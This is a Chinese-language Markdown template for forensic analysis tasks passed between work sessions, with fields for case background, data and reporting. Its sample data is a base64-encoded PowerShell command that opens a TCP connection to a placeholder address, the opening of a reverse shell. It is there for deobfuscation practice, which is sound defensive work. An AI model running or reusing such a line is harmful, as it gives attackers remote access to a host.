# TASK: [任務代號_簡短名稱]

## 1. 任務基本資訊
- **所屬大題**：`C00_Template`
- **關聯小題**：例如 `Q03, Q04`
- **發起 Session**：`Session-Antigravity`
- **發起時間**：`YYYY-MM-DD HH:MM:SS UTC`
- **期望技能**：`[代碼逆向 / 去混淆]` / `[海量日誌過濾]` / `[封包解構]` / `[第二意見審查]`
- **當前狀態**：`⚪ 待接單` / `🟢 處理中` / `✅ 已完成`

---

## 2. 案情背景與目標
*(簡述目前遇到的瓶頸與需要輔助 Session 協助解答的具體問題)*
> 例如：在受害主機的排程任務中發現一段 Base64 編碼的 PowerShell 指令，請協助還原其真實執行的 Payload、解出連線網址與寫入的檔案路徑。

---

## 3. 待分析資料片段 (Context Payload)
*(直接附上文字、日誌片段、Base64 字串或十六進位 Hex，切勿上傳二進位大檔)*

```text
powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMgAwADMALgAwAC4AMQAxADMALgAxADAAIgAsADgAMAA4ADAAKQA7AA==
```

---

## 4. 接單 Session 輸出規範
請支援 Session 在完成後：
1. 將本任務檔案狀態改為 `✅ 已完成`。
2. 在 `findings/` 目錄建立對應的 `FINDING_[任務代號].md`，格式參照 `FINDING_TEMPLATE.md`。
